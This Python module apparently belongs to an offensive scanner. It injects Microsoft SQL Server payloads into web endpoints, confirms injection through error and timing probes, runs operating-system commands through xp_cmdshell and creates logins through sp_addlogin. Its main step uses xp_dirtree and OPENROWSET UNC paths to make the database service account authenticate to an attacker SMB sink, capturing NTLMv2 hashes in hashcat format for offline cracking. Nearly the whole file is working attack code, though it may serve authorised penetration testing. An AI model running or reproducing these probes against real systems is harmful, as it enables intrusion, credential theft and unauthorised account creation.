"""
sql_probe.py — Dialect-specific SQL injection probes (Microsoft SQL Server
focus, with NTLMv2 hash capture via UNC coercion).

active_scanner already covers generic blind SQLi (error + time). This
module goes deeper on Microsoft SQL Server:

    mssql_error           Inject dialect-specific syntax, grep MSSQL error patterns.
    mssql_time            WAITFOR DELAY '0:0:3' — measure timing delta.
    xp_cmdshell           Read-only commands (whoami / hostname) when destructive
                          mode is OFF; loud commands (net user / systeminfo / etc.)
                          when --allow-windows-destructive is set.
    xp_dirtree_coerce     EXEC xp_dirtree '\\\\<sink>\\<token>\\probe' — forces the
                          MSSQL service account to authenticate to our SMB sink;
                          NTLMv2 hashes captured in hashcat -m 5600 format.
    openrowset            OPENROWSET / OPENDATASOURCE UNC coercion — useful when
                          xp_dirtree is restricted.
    sp_addlogin           DESTRUCTIVE — creates SQL login. Gated.

Pipeline position: after active_scanner + nosql_probe, before desync_probe.
Gated by --active-scan. Destructive payloads gated by
--allow-windows-destructive.

Selection: prioritizes endpoints where stack_profile.detected_keys ∋
{mssql, iis} or where classifier findings carry MSSQL error fragments
in response_snippet. Falls back to top INJECTION-tagged endpoints.

Output: SQLProbeResult.findings with attack_type / verdict / oob_hit flags
and optional ntlm_hash text suitable for offline cracking.
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import parse_qs, urlparse

import httpx

import payloads as _payloads
from verifier import inject_param


# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_MSSQL_ERROR_RE = re.compile("|".join(_payloads.mssql_error_patterns()), re.IGNORECASE)
_XP_CMDSHELL_OUTPUT_RE = re.compile(
    r"(?:nt authority|nt service|workgroup\\|Windows IP Configuration|"
    r"User accounts for|Image Name\s+PID|Host Name:\s+\S)",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class SQLProbeFinding:
    endpoint: str
    method: str
    param: str
    attack_type: str        # mssql_error | mssql_time | xp_cmdshell |
                            # xp_dirtree_coerce | openrowset | sp_addlogin
    payload: str
    verdict: str            # confirmed | likely | not_confirmed
    confidence: float
    evidence: str
    response_snippet: str = ""
    timing_delta: float = 0.0
    oob_hit: bool = False
    oob_protocol: str = ""  # smb | http | dns
    ntlm_hash: str = ""     # hashcat -m 5600 / -m 5500 ready
    ntlm_user: str = ""
    ntlm_domain: str = ""

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint,
            "method": self.method,
            "param": self.param,
            "attack_type": self.attack_type,
            "payload": self.payload,
            "verdict": self.verdict,
            "confidence": round(self.confidence, 2),
            "evidence": self.evidence,
            "response_snippet": self.response_snippet[:300],
            "timing_delta": round(self.timing_delta, 2),
            "oob_hit": self.oob_hit,
            "oob_protocol": self.oob_protocol,
            "ntlm_hash": self.ntlm_hash,
            "ntlm_user": self.ntlm_user,
            "ntlm_domain": self.ntlm_domain,
        }


@dataclass
class SQLProbeResult:
    endpoints_tested: int = 0
    findings: list[SQLProbeFinding] = field(default_factory=list)
    ntlm_hashes_captured: int = 0
    dialect_detected: bool = False

    @property
    def confirmed(self) -> list[SQLProbeFinding]:
        return [f for f in self.findings if f.verdict == "confirmed"]

    @property
    def likely(self) -> list[SQLProbeFinding]:
        return [f for f in self.findings if f.verdict == "likely"]

    def to_dict(self) -> dict:
        return {
            "endpoints_tested": self.endpoints_tested,
            "dialect_detected": self.dialect_detected,
            "ntlm_hashes_captured": self.ntlm_hashes_captured,
            "confirmed": len(self.confirmed),
            "likely": len(self.likely),
            "findings": [f.to_dict() for f in self.findings],
        }


# ---------------------------------------------------------------------------
# Probe
# ---------------------------------------------------------------------------

class SQLProbe:
    def __init__(
        self,
        auth_headers: Optional[dict] = None,
        timeout: float = 10.0,
        timing_threshold: float = 2.5,
        canary=None,                # Optional canary.Canary — secondary OOB
        payload_server=None,        # Optional payload_server.PayloadServer
        smb_sink=None,              # Optional smb_sink.SMBSink — primary OOB
        public_url: Optional[str] = None,
        stack_profile=None,         # Optional stackprint.StackProfile
        allow_destructive: bool = False,
    ) -> None:
        self.auth_headers = auth_headers or {}
        self.timeout = timeout
        self.timing_threshold = timing_threshold
        self.canary = canary
        self.payload_server = payload_server
        self.smb_sink = smb_sink
        self.public_url = (public_url or "").rstrip("/") or None
        self.stack_profile = stack_profile
        self.allow_destructive = allow_destructive

    # ── public entrypoint ──────────────────────────────────────────────

    async def run(self, classifier_findings, active_result=None,
                  max_endpoints: int = 25) -> SQLProbeResult:
        from classifier import Cat

        result = SQLProbeResult()
        if not classifier_findings:
            return result

        # Eager-detect MSSQL based on stackprint and active-scan history
        keys = getattr(self.stack_profile, "detected_keys", set()) if self.stack_profile else set()
        mssql_signaled = "mssql" in keys or "iis" in keys or "aspnet" in keys

        # Cross-reference with active_scan results — any finding whose
        # response_snippet matched an MSSQL error pattern raises priority.
        mssql_hot_urls: set[str] = set()
        if active_result:
            for sf in getattr(active_result, "findings", []):
                snippet = getattr(sf, "response_snippet", "") or ""
                if _MSSQL_ERROR_RE.search(snippet):
                    mssql_hot_urls.add(getattr(sf, "url", ""))
                    mssql_signaled = True

        result.dialect_detected = mssql_signaled

        # Two-tier endpoint selection
        priority: list = []
        secondary: list = []
        for f in classifier_findings:
            if f.url in mssql_hot_urls:
                priority.append(f)
                continue
            if Cat.INJECTION in f.categories:
                priority.append(f)
                continue
            if mssql_signaled and (parse_qs(urlparse(f.url).query) or f.body):
                secondary.append(f)
        secondary.sort(key=lambda f: -getattr(f, "score", 0))
        targets = (priority + secondary)[:max_endpoints]
        result.endpoints_tested = len(targets)
        if not targets:
            return result

        async with httpx.AsyncClient(
            verify=False, follow_redirects=True,
            timeout=self.timeout, headers=self.auth_headers,
        ) as client:
            tasks = [self._probe_endpoint(client, f) for f in targets]
            all_findings = await asyncio.gather(*tasks, return_exceptions=True)

        for item in all_findings:
            if isinstance(item, list):
                result.findings.extend(item)

        # Final NTLM-hash sweep — anything the SMB sink captured during the
        # probe window gets attached. Mark `ntlm_hashes_captured` for the
        # scorecard even when path-correlation didn't tie them to a probe.
        if self.smb_sink is not None and getattr(self.smb_sink, "available", False):
            captured = self.smb_sink.all_hits()
            result.ntlm_hashes_captured = len(captured)

        return result

    # ── per-endpoint orchestration ─────────────────────────────────────

    async def _probe_endpoint(self, client: httpx.AsyncClient, finding) -> list[SQLProbeFinding]:
        url = finding.url
        method = (finding.method or "GET").upper()
        parsed = urlparse(url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        body = finding.body
        if not params and not body:
            return []
        param = next(iter(params)) if params else None

        try:
            baseline = await self._send(client, method, url, body)
            baseline_status = baseline.status_code
            baseline_text = baseline.text[:4000]
            baseline_time = await self._measure_baseline_time(client, method, url, body)
        except Exception:
            return []

        coros = [
            self._test_mssql_error(client, url, method, param, params, body, baseline_status, baseline_text),
            self._test_mssql_time(client, url, method, param, params, body, baseline_time),
            self._test_xp_cmdshell(client, url, method, param, params, body),
            self._test_xp_dirtree(client, url, method, param, params, body),
            self._test_openrowset(client, url, method, param, params, body),
        ]
        if self.allow_destructive:
            coros.append(self._test_sp_addlogin(client, url, method, param, params, body))

        out: list[SQLProbeFinding] = []
        for sub in await asyncio.gather(*coros, return_exceptions=True):
            if isinstance(sub, list):
                out.extend(sub)
        return out

    # ── individual attack types ────────────────────────────────────────

    async def _test_mssql_error(
        self, client, url, method, param, params, body,
        baseline_status: int, baseline_text: str,
    ) -> list[SQLProbeFinding]:
        # Skip if baseline already leaks MSSQL — we're scanning for *new*
        # confirmations, not re-confirming what active_scanner found.
        already_leaky = bool(_MSSQL_ERROR_RE.search(baseline_text))
        out: list[SQLProbeFinding] = []
        for payload in _payloads.mssql_basic()[:20]:
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                r = await self._send(client, method, probe_url, probe_body)
            except Exception:
                continue
            txt = r.text[:4000]
            if _MSSQL_ERROR_RE.search(txt) and not already_leaky:
                out.append(SQLProbeFinding(
                    endpoint=url, method=method, param=param or "(body)",
                    attack_type="mssql_error", payload=payload,
                    verdict="confirmed", confidence=0.95,
                    evidence="MSSQL error pattern triggered by injected payload",
                    response_snippet=txt[:300],
                ))
                break
        return out

    async def _test_mssql_time(
        self, client, url, method, param, params, body,
        baseline_time: float,
    ) -> list[SQLProbeFinding]:
        out: list[SQLProbeFinding] = []
        for payload in _payloads.mssql_time()[:8]:
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            t0 = time.monotonic()
            try:
                await self._send(client, method, probe_url, probe_body)
            except Exception:
                continue
            delta = time.monotonic() - t0 - baseline_time
            if delta >= self.timing_threshold:
                out.append(SQLProbeFinding(
                    endpoint=url, method=method, param=param or "(body)",
                    attack_type="mssql_time", payload=payload,
                    verdict="confirmed", confidence=0.9,
                    evidence=f"WAITFOR DELAY response was {delta:.1f}s slower than baseline",
                    timing_delta=delta,
                ))
                break
        return out

    async def _test_xp_cmdshell(
        self, client, url, method, param, params, body,
    ) -> list[SQLProbeFinding]:
        out: list[SQLProbeFinding] = []
        payloads_to_run = _payloads.mssql_xp_cmdshell_safe()[:]
        if self.allow_destructive:
            payloads_to_run.extend(_payloads.mssql_xp_cmdshell_destructive())
        for payload in payloads_to_run:
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                r = await self._send(client, method, probe_url, probe_body)
            except Exception:
                continue
            txt = r.text[:4000]
            if _XP_CMDSHELL_OUTPUT_RE.search(txt):
                out.append(SQLProbeFinding(
                    endpoint=url, method=method, param=param or "(body)",
                    attack_type="xp_cmdshell", payload=payload,
                    verdict="confirmed", confidence=0.95,
                    evidence="xp_cmdshell output (whoami/hostname/net-user) reflected in response",
                    response_snippet=txt[:300],
                ))
                return out  # one is enough — don't keep firing destructive cmds
        return out

    async def _test_xp_dirtree(
        self, client, url, method, param, params, body,
    ) -> list[SQLProbeFinding]:
        """The headline probe — UNC coercion → NTLM hash capture."""
        out: list[SQLProbeFinding] = []
        canary_host, token, source = self._pick_oob_target("sqlxpdir")
        if not canary_host:
            return out  # no sink available

        for payload in _payloads.mssql_xp_dirtree(canary_host, token):
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                await self._send(client, method, probe_url, probe_body)
            except Exception:
                continue

        # Give MSSQL up to ~3.5s to do the SMB auth dance before polling
        await asyncio.sleep(3.5)

        ntlm_hits = self._collect_ntlm_hits(token)
        if ntlm_hits:
            for hit in ntlm_hits:
                out.append(SQLProbeFinding(
                    endpoint=url, method=method, param=param or "(body)",
                    attack_type="xp_dirtree_coerce",
                    payload=f"EXEC xp_dirtree '\\\\{canary_host}\\{token}\\probe'--",
                    verdict="confirmed", confidence=0.99,
                    evidence=("MSSQL service account authenticated to SMB sink — "
                              "NTLM hash captured for offline cracking"),
                    oob_hit=True, oob_protocol="smb",
                    ntlm_hash=hit.hash_string,
                    ntlm_user=hit.username,
                    ntlm_domain=hit.domain,
                ))
            return out

        # No SMB hit — fallback: check canary for DNS/HTTP hits (some
        # configurations or libcurl-on-Windows-fronted MSSQL escalate to HTTP)
        canary_hits = self._collect_canary_hits(token)
        if canary_hits:
            proto = canary_hits[0].protocol if canary_hits else "dns"
            out.append(SQLProbeFinding(
                endpoint=url, method=method, param=param or "(body)",
                attack_type="xp_dirtree_coerce",
                payload=f"EXEC xp_dirtree '\\\\{canary_host}\\{token}\\probe'--",
                verdict="likely", confidence=0.85,
                evidence=(f"xp_dirtree triggered {proto.upper()} callback to canary — "
                          "UNC coercion confirmed; SMB hash not captured "
                          "(target may have outbound 445 blocked)"),
                oob_hit=True, oob_protocol=proto,
            ))
        return out

    async def _test_openrowset(
        self, client, url, method, param, params, body,
    ) -> list[SQLProbeFinding]:
        out: list[SQLProbeFinding] = []
        canary_host, token, _ = self._pick_oob_target("sqlorw")
        if not canary_host:
            return out
        for payload in _payloads.mssql_openrowset(canary_host, token):
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                await self._send(client, method, probe_url, probe_body)
            except Exception:
                continue
        await asyncio.sleep(3.0)
        if self._collect_ntlm_hits(token):
            out.append(SQLProbeFinding(
                endpoint=url, method=method, param=param or "(body)",
                attack_type="openrowset",
                payload=f"OPENROWSET to \\\\{canary_host}\\{token}",
                verdict="confirmed", confidence=0.95,
                evidence="OPENROWSET / OPENDATASOURCE coerced NTLM auth to SMB sink",
                oob_hit=True, oob_protocol="smb",
            ))
        return out

    async def _test_sp_addlogin(
        self, client, url, method, param, params, body,
    ) -> list[SQLProbeFinding]:
        """DESTRUCTIVE — only runs when allow_destructive=True."""
        out: list[SQLProbeFinding] = []
        for payload in _payloads.mssql_sp_addlogin():
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                r = await self._send(client, method, probe_url, probe_body)
            except Exception:
                continue
            txt = r.text[:4000]
            if not _MSSQL_ERROR_RE.search(txt) and r.status_code < 500:
                out.append(SQLProbeFinding(
                    endpoint=url, method=method, param=param or "(body)",
                    attack_type="sp_addlogin", payload=payload,
                    verdict="likely", confidence=0.6,
                    evidence=("sp_addlogin payload accepted without MSSQL error — "
                              "verify manually whether the login was created"),
                    response_snippet=txt[:300],
                ))
                return out
        return out

    # ── OOB plumbing ───────────────────────────────────────────────────

    def _pick_oob_target(self, kind: str) -> tuple[str, str, str]:
        """Return (canary_host, token, source) for embedding into UNC payloads.
        Prefers the SMB sink (real hash capture) over the HTTP canary. Returns
        empty strings when no OOB infra is available."""
        if self.smb_sink is not None and getattr(self.smb_sink, "available", False):
            # SMB sink's listen host — should be the operator's externally-reachable IP.
            # When the sink binds to 0.0.0.0 we can't derive the public address
            # automatically; the operator sets `public_url` on the scan context.
            host = self.public_url.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0] \
                   if self.public_url else self.smb_sink.listen_host
            token = self.smb_sink.mint_token(kind)
            return host, token, "smb_sink"
        if self.canary is not None and getattr(self.canary, "available", False):
            url = self.canary.generate(kind)
            if url:
                # Strip the scheme so the value can sit inside a UNC `\\host\path`
                host = url.replace("http://", "").replace("https://", "").split("/", 1)[0]
                return host, kind, "canary"
        return "", "", ""

    def _collect_ntlm_hits(self, token: str) -> list:
        if self.smb_sink is None or not getattr(self.smb_sink, "available", False):
            return []
        try:
            return self.smb_sink.hits_for(token)
        except Exception:
            return []

    def _collect_canary_hits(self, tag: str) -> list:
        if self.canary is None or not getattr(self.canary, "available", False):
            return []
        try:
            # Canary.poll is async — call it from a sync helper isn't safe;
            # but _test_xp_dirtree is async and awaits us via asyncio.sleep, so
            # the canary may have hits already polled by an earlier sweep.
            # We use the cached `hits` list if exposed.
            cached = getattr(self.canary, "hits", None) or []
            return [h for h in cached if getattr(h, "tag", "") == tag]
        except Exception:
            return []

    # ── HTTP helpers ───────────────────────────────────────────────────

    async def _send(self, client, method, url, body):
        headers = self.auth_headers
        if body:
            headers = {**self.auth_headers, "Content-Type": "application/json"}
        if method == "GET":
            return await client.get(url, headers=headers)
        return await client.request(method, url, content=body, headers=headers)

    async def _measure_baseline_time(self, client, method, url, body) -> float:
        t0 = time.monotonic()
        try:
            await self._send(client, method, url, body)
        except Exception:
            return 0.0
        return time.monotonic() - t0
